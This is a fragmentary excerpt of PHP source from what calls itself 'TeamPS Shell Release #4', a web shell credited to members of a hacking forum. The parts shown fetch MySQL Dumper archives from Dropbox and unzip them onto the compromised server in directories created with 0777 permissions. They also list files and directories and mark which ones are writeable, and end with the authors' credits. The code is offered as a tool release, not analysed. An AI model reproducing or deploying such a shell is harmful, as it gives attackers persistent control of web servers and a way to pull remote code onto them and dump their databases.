...
<a class ='navbar' href='http://p0wersurge.com'>p0wersurge</a> &copy;2013								Plum, JB & KrypTiK
...
if (isset($_GET['installMySQL'])) {
    echo "<center>
<font size='4'>
<a href='?msd3' class='navbar'>Install MySQL Dumper v3 By: Plum</a>
<br>
<br>
<a href='?msd1' class='navbar'>Install MySQL Dumper v2.1 By: Plum</a>
<br>
<br>
...
if (isset($_POST['installmsd1'])) {
    ...
    $link = file_get_contents("https://dl.dropboxusercontent.com/u/1141366/MSD_v2.1.zip");
...
if (isset($_POST['installmsd2'])) {
    ...
    $link = file_get_contents("https://dl.dropboxusercontent.com/u/1141366/msd.zip");
...
If directory does not exist it will attempt to create it.
<form action='' method='post'>
<input type='text' name='msd3dir' class='text' size='50' value='$dir/msd'>
<input type='submit' name='installmsd3' value='Install'>
<form>
</font>
</center>
<br>";
}
if (isset($_POST['installmsd3'])) {
    $msd3dir = rtrim($_POST['msd3dir'], "/");
    $msd3dir2 = "$msd1dir/msdv3.zip";
    if (!is_dir($msd3dir)) {
        if (!mkdir($msd3dir, 0777)) {
            error("Failed to make directory $msd3dir");
        }
    }
    $link = file_get_contents("https://dl.dropboxusercontent.com/u/1141366/msd3.zip");
    if (file_put_contents($msd3dir2, $link)) {
        unzip($msd3dir2, $msd3dir);
    } else {
        error("Could not write to $msd3dir");
    }
}
//Delete Directory
...
$wr = is_writeable($dir) ? "<font color='green'><b>[ Writeable ]</b></font>" : "<font color='red'><b>[ Non Writeable ]</b></font>";
...
foreach ($direcs as $d) {
    ...
    $dwrite = is_writeable("$dir/$d") ? "<font color='green'><b>Writeable</b></font>" : "<font color='red'><b>Non Writeable</b></font>";
    $dsize = "Directory";
...
foreach ($files as $f) {
    ...
    $fwrite = is_writeable("$dir/$f") ? "<font color='green'><b>Writeable</b></font>" : "<font color='red'><b>Non Writeable</b></font>";
...
closedir();
echo '<br />';
echo '<font color="#14ab00">TeamPS Shell Release #4
<br />
Built by <a href="http://www.p0wersurge.com/forums/members/306-plum.html" target="_blank">Plum</a>, <a href="http://www.p0wersurge.com/forums/members/1-jb.html" target="_blank">JB</a> and <a href="http://www.p0wersurge.com/forums/members/1619-kryptik.html" target="_blank">KrypTiK</a></font>';
